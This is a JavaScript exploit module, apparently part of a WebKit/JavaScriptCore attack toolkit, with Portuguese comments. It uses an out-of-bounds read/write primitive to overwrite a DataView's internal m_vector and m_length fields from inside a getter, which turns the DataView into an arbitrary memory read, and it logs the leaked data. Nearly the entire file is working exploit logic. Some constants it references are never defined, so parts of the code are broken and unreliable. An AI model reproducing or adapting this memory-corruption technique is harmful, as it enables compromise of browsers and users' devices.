// js/script3/testArrayBufferVictimCrash.mjs (Getter Reconfigura DataView para Leitura)
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real, 
    oob_dataview_real,     
    oob_write_absolute,    
    oob_read_absolute,     
    clearOOBEnvironment,
    isOOBReady
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

export const FNAME_MODULE_V28 = "GetterReconfigDV_Read_v1";

// Constantes
const TARGET_OFFSET_FOR_GETTER_TO_READ_FROM_0x68 = 0x68; // Getter lê o endereço/offset daqui
const TRIGGER_WRITE_OFFSET = 0x70;
const TRIGGER_WRITE_VALUE = 0xFFFFFFFF;

const DATA_COPY_DEST_OFFSET_IN_OOB = 0x0100;    // Onde o getter copia os dados lidos
const ACTUAL_DATA_LOCATION_IN_OOB = 0x0300;   // Novo offset para dados de teste
const ACTUAL_DATA_VALUE_LOW = 0xFEEDF00D;
const ACTUAL_DATA_VALUE_HIGH = 0xDEADBEEF;

// Offsets para reconfigurar o oob_dataview_real (metadados do oob_dataview_real estão em 0x58)
// OOB_DV_BASE_OFFSET_IN_OOB_REAL = 0x58 (implícito)
const OOB_DV_M_VECTOR_OFFSET_ABS = 0x58 + JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET; // Geralmente 0x68
const OOB_DV_M_LENGTH_OFFSET_ABS = 0x58 + JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET; // Geralmente 0x70
// const OOB_DV_M_MODE_OFFSET_ABS   = 0x58 + JSC_OFFSETS.ArrayBufferView.M_MODE_OFFSET;   // Geralmente 0x74

let getter_object_ref = null;
let address_used_by_getter_for_reconfig = null; 
let data_successfully_read_after_reconfig = false;

function ReconfigDVAndReadGetter() {
    logS3(`>>>> [ReconfigDVAndReadGetter ACIONADO!] <<<<`, "vuln", `${FNAME_MODULE_V28}.Getter`);
    data_successfully_read_after_reconfig = false;
    address_used_by_getter_for_reconfig = null;

    let original_oob_dv_m_vector = null;
    let original_oob_dv_m_length = null;

    try {
        // 1. Salvar o estado original do oob_dataview_real para restauração
        original_oob_dv_m_vector = oob_read_absolute(OOB_DV_M_VECTOR_OFFSET_ABS, 8);
        original_oob_dv_m_length = oob_read_absolute(OOB_DV_M_LENGTH_OFFSET_ABS, 4);
        logS3(`    [GetterReconfigDV] Estado Original DV: m_vector=${original_oob_dv_m_vector.toString(true)}, m_length=${toHex(original_oob_dv_m_length)}`, "info");


        // 2. Getter lê o QWORD de TARGET_OFFSET_FOR_GETTER_TO_READ_FROM_0x68 (0x68)
        // Este QWORD deve conter o endereço/offset (como AdvancedInt64(offset, 0)) que queremos usar como NOVO m_vector.
        const qword_new_m_vector_target = oob_read_absolute(TARGET_OFFSET_FOR_GETTER_TO_READ_FROM_0x68, 8);
        if (!isAdvancedInt64Object(qword_new_m_vector_target)) {
             logS3(`    [GetterReconfigDV] Valor lido de ${toHex(TARGET_OFFSET_FOR_GETTER_TO_READ_FROM_0x68)} não é AdvancedInt64.`, "error");
             return "getter_error_reading_target_ptr";
        }
        address_used_by_getter_for_reconfig = qword_new_m_vector_target;
        logS3(`    [GetterReconfigDV] Novo m_vector alvo (lido de ${toHex(TARGET_OFFSET_FOR_GETTER_TO_READ_FROM_0x68)}): ${address_used_by_getter_for_reconfig.toString(true)}`, "leak");

        // Para este teste, esperamos que address_used_by_getter_for_reconfig.low() seja o offset e .high() seja 0.
        if (address_used_by_getter_for_reconfig.high() !== 0) {
            logS3(`    [GetterReconfigDV] ATENÇÃO: Parte alta do m_vector alvo não é zero (${toHex(address_used_by_getter_for_reconfig.high())}). Isso pode não funcionar se o alvo for um offset dentro do oob_array_buffer_real.`, "warn");
            // Continuar mesmo assim para ver o que acontece.
        }
        const new_m_vector_value = address_used_by_getter_for_reconfig; // Usar o QWORD inteiro como novo m_vector
                                                                       // Se for um endereço absoluto, esta é a forma correta.
                                                                       // Se for um offset DENTRO do oob_array_buffer_real, e o motor JS espera
                                                                       // um ponteiro relativo ao início do oob_array_buffer_real para m_vector,
                                                                       // então new_m_vector_value deveria ser AdvancedInt64(offset_real, 0).
                                                                       // O log de sucesso anterior mostrou que ler 0x68 deu AdvancedInt64(0, 0x200)
                                                                       // e usamos .high() como offset. Aqui, plantaremos o offset em .low().

        // 3. Reconfigurar o oob_dataview_real
        const new_m_length_value = 16; // Ler 16 bytes do endereço alvo
        logS3(`    [GetterReconfigDV] Reconfigurando oob_dataview_real: m_vector=${new_m_vector_value.toString(true)}, m_length=${toHex(new_m_length_value)}`, "warn");
        
        oob_write_absolute(OOB_DV_M_VECTOR_OFFSET_ABS, new_m_vector_value, 8);
        oob_write_absolute(OOB_DV_M_LENGTH_OFFSET_ABS, new_m_length_value, 4);
        // Poderíamos também setar m_mode se necessário: oob_write_absolute(OOB_DV_M_MODE_OFFSET_ABS, 0, 4);

        // DÁ UM TEMPO PARA O MOTOR JS "ASSIMILAR" A MUDANÇA NO DATAVIEW?
        // Uma pausa aqui pode ser arriscada dentro de um getter. O ideal é que seja imediato.
        // Se a leitura falhar, é porque o DataView não foi atualizado a tempo ou o m_vector é inválido.

        // 4. Usar o oob_dataview_real (agora reconfigurado) para ler do novo m_vector
        logS3(`    [GetterReconfigDV] Tentando ler ${new_m_length_value} bytes de ${new_m_vector_value.toString(true)} (offset 0 do oob_dataview_real reconfigurado)...`, "info");
        
        // LEITURA DIRETA USANDO O oob_dataview_real que foi reconfigurado
        // Esta leitura agora acontece no NOVO m_vector que definimos.
        const data_low = oob_dataview_real.getUint32(0, true); 
        const data_high = oob_dataview_real.getUint32(4, true);
        const data_read_from_reconfigured_dv = new AdvancedInt64(data_low, data_high);
        
        logS3(`    [GetterReconfigDV] Dados lidos (primeiros 8 bytes) via DV reconfigurado: ${data_read_from_reconfigured_dv.toString(true)}`, "leak");

        // 5. Copiar os dados lidos para DATA_COPY_DEST_OFFSET_IN_OOB
        oob_write_absolute(DATA_COPY_DEST_OFFSET_IN_OOB, data_read_from_reconfigured_dv, 8);
        data_successfully_read_after_reconfig = true;
        logS3(`    [GetterReconfigDV] Dados lidos copiados para ${toHex(DATA_COPY_DEST_OFFSET_IN_OOB)}.`, "info");

    } catch (e) {
        logS3(`    ERRO DENTRO DO ReconfigDVAndReadGetter: ${e.name} - ${e.message}\n${e.stack}`, "critical");
    } finally {
        // RESTAURAR oob_dataview_real para seu estado original (apontar para o início do oob_array_buffer_real com tamanho total)
        // É CRUCIAL fazer isso para que futuras chamadas a oob_read/write_absolute funcionem como esperado.
        if (isAdvancedInt64Object(original_oob_dv_m_vector) && typeof original_oob_dv_m_length === 'number') {
            try {
                logS3(`    [GetterReconfigDV] Restaurando oob_dataview_real para m_vector=${original_oob_dv_m_vector.toString(true)}, m_length=${toHex(original_oob_dv_m_length)}...`, "info");
                oob_write_absolute(OOB_DV_M_VECTOR_OFFSET_ABS, original_oob_dv_m_vector, 8);
                oob_write_absolute(OOB_DV_M_LENGTH_OFFSET_ABS, original_oob_dv_m_length, 4);
                logS3(`    [GetterReconfigDV] oob_dataview_real (esperançosamente) restaurado.`, "info");
            } catch (e_restore) {
                 logS3(`    [GetterReconfigDV] ERRO ao tentar restaurar oob_dataview_real: ${e_restore.message}`, "error");
            }
        } else {
            logS3(`    [GetterReconfigDV] Não foi possível restaurar oob_dataview_real (valores originais não capturados).`, "warn");
        }
    }
    return "reconfig_dv_getter_executed";
}

export async function executeArrayBufferVictimCrashTest() {
    const FNAME_CURRENT_TEST = `${FNAME_MODULE_V28}.attemptReconfigDVRead`;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Teste de Leitura com Reconfiguração de DataView via Getter ---`, "test", FNAME_CURRENT_TEST);
    document.title = `${FNAME_MODULE_V28} Inic...`;

    address_used_by_getter_for_reconfig = null;
    data_successfully_read_after_reconfig = false;
    getter_object_ref = {};

    let errorCapturedMain = null;
    let exploit_result = {
        success: false,
        address_targeted_str: null,
        data_planted_at_target_str: null,
        data_read_and_copied_str: null,
        message: "Teste não iniciado."
    };

    try {
        await triggerOOB_primitive({ force_reinit: true });
        if (!isOOBReady()) { 
            throw new Error("OOB Init falhou ou ambiente não está pronto."); 
        }
        logS3("Ambiente OOB inicializado e pronto.", "info", FNAME_CURRENT_TEST);

        // PASSO 1a: Plantar dados de teste em TARGET_DATA_LOCATION_IN_OOB (ex: 0x300)
        const target_data_to_plant = new AdvancedInt64(TARGET_DATA_VALUE_LOW, TARGET_DATA_VALUE_HIGH);
        exploit_result.data_planted_at_target_str = target_data_to_plant.toString(true);
        logS3(`PASSO 1a: Plantando dados de teste ${exploit_result.data_planted_at_target_str} em oob_buffer[${toHex(TARGET_DATA_LOCATION_IN_OOB)}]`, "info", FNAME_CURRENT_TEST);
        oob_write_absolute(TARGET_DATA_LOCATION_IN_OOB, target_data_to_plant, 8);

        // PASSO 1b: Plantar o OFFSET (TARGET_DATA_LOCATION_IN_OOB) que o getter deve ler de 0x68
        // O getter usará este valor como o novo m_vector para o oob_dataview_real.
        // Plantamos AdvancedInt64(TARGET_DATA_LOCATION_IN_OOB, 0) porque o getter usará .low() como offset.
        const qword_for_getter_to_read_as_target_addr = new AdvancedInt64(TARGET_DATA_LOCATION_IN_OOB, 0);
        logS3(`PASSO 1b: Plantando QWORD ${qword_for_getter_to_read_as_target_addr.toString(true)} (contendo o offset alvo) em oob_buffer[${toHex(TARGET_OFFSET_FOR_GETTER_TO_READ_FROM_0x68)}] (0x68)`, "info", FNAME_CURRENT_TEST);
        oob_write_absolute(TARGET_OFFSET_FOR_GETTER_TO_READ_FROM_0x68, qword_for_getter_to_read_as_target_addr, 8); 
        
        oob_write_absolute(DATA_COPY_DEST_OFFSET_IN_OOB, new AdvancedInt64(0,0), 8); // Limpar local de cópia

        Object.defineProperty(getter_object_ref, 'triggerReconfigRead', {
            get: ReconfigDVAndReadGetter,
            configurable: true
        });
        logS3("PASSO 2: Getter 'triggerReconfigRead' definido.", "info", FNAME_CURRENT_TEST);

        logS3(`PASSO 3: Escrevendo valor de trigger ${toHex(TRIGGER_WRITE_VALUE)} em oob_buffer[${toHex(TRIGGER_WRITE_OFFSET)}] (0x70)...`, "warn", FNAME_CURRENT_TEST);
        oob_write_absolute(TRIGGER_WRITE_OFFSET, TRIGGER_WRITE_VALUE, 4);
        logS3(`  Escrita de trigger realizada.`, "info", FNAME_CURRENT_TEST);

        // Verificar o valor em 0x68 APÓS o trigger, ANTES do getter
        const val_at_0x68_post_trigger = oob_read_absolute(TARGET_OFFSET_FOR_GETTER_TO_READ_FROM_0x68, 8);
        logS3(`  Valor em ${toHex(TARGET_OFFSET_FOR_GETTER_TO_READ_FROM_0x68)} (lido por oob_read_absolute) APÓS trigger e ANTES do getter: ${isAdvancedInt64Object(val_at_0x68_post_trigger) ? val_at_0x68_post_trigger.toString(true) : "Erro"}`, "important");


        logS3("PASSO 4: Tentando acionar o getter acessando getter_object_ref.triggerReconfigRead...", "warn", FNAME_CURRENT_TEST);
        try {
            const getter_return_value = getter_object_ref.triggerReconfigRead;
            logS3(`  Acesso à propriedade do getter retornou: ${getter_return_value}`, "info", FNAME_CURRENT_TEST);
        } catch (e_getter_access) {
            logS3(`  ERRO ao tentar acionar o getter: ${e_getter_access.name} - ${e_getter_access.message}`, "error", FNAME_CURRENT_TEST);
        }

        exploit_result.address_targeted_str = address_used_by_getter_for_reconfig ? address_used_by_getter_for_reconfig.toString(true) : "N/A";

        if (data_successfully_read_after_reconfig) {
            const copied_data = oob_read_absolute(DATA_COPY_DEST_OFFSET_IN_OOB, 8);
            exploit_result.copied_data_str = isAdvancedInt64Object(copied_data) ? copied_data.toString(true) : "ERRO_LEITURA_COPIA";
            logS3(`PASSO 5: Dados copiados para ${toHex(DATA_COPY_DEST_OFFSET_IN_OOB)}: ${exploit_result.copied_data_str}`, "leak", FNAME_CURRENT_TEST);

            if (isAdvancedInt64Object(copied_data) && copied_data.equals(target_data_to_plant)) {
                exploit_result.success = true;
                exploit_result.message = "SUCESSO! Getter leu endereço/offset, reconfigurou DV, leu dados e copiou corretamente!";
                document.title = `${FNAME_MODULE_V28}: DV RECONFIG OK!`;
                logS3(`  !!!! ${exploit_result.message} !!!!`, "vuln", FNAME_CURRENT_TEST);
            } else {
                exploit_result.message = "Dados copiados, mas não correspondem aos dados originais plantados.";
                document.title = `${FNAME_MODULE_V28}: DV Reconfig Cópia Incorreta`;
            }
        } else {
            exploit_result.message = "Getter foi acionado, mas os dados não foram marcados como lidos/copiados com sucesso após reconfiguração do DV.";
            logS3(`  Getter acionado, mas 'data_successfully_read_after_reconfig' é false. Endereço alvo que o getter usou: ${exploit_result.address_targeted_str}`, "warn", FNAME_CURRENT_TEST);
            document.title = `${FNAME_MODULE_V28}: Falha Reconfig DV`;
        }
    } catch (e_outer_main) {
        errorCapturedMain = e_outer_main;
        logS3(`ERRO CRÍTICO GERAL: ${e_outer_main.name} - ${e_outer_main.message}`, "critical", FNAME_CURRENT_TEST);
        if (e_outer_main.stack) logS3(`Stack: ${e_outer_main.stack}`, "critical", FNAME_CURRENT_TEST);
        exploit_result.message = `Erro geral: ${e_outer_main.name} - ${e_outer_main.message}`;
        document.title = `${FNAME_MODULE_V28} ERRO CRÍTICO`;
    } finally {
        // Garantir que o ambiente OOB seja limpo APENAS UMA VEZ ao final de tudo.
        // A restauração do oob_dataview_real é feita dentro do getter.
        clearOOBEnvironment({force_clear_even_if_not_setup: true}); 
        logS3(`--- ${FNAME_CURRENT_TEST} Concluído (Ambiente OOB limpo) ---`, "test", FNAME_CURRENT_TEST);
        logS3(`Resultado Reconfig DV Read: Success=${exploit_result.success}, Msg='${exploit_result.message}'`, exploit_result.success ? "good" : "warn", FNAME_CURRENT_TEST);
        logS3(`  Endereço Alvo Lido pelo Getter (de 0x68): ${exploit_result.address_targeted_str}`, "info", FNAME_CURRENT_TEST);
        if(exploit_result.copied_data_str) logS3(`  Dados Copiados (de ${toHex(DATA_COPY_DEST_OFFSET_IN_OOB)}): ${exploit_result.copied_data_str}`, "leak", FNAME_CURRENT_TEST);
        getter_object_ref = null;
    }
    
    return { 
        errorOccurred: errorCapturedMain, 
        exploit_attempt_result: exploit_result,
        toJSON_details: { 
            probe_variant: FNAME_MODULE_V28, 
            this_type_in_toJSON: (exploit_result.success ? "getter_reconfig_dv_success" : "getter_reconfig_dv_failed"),
        }
    };
}
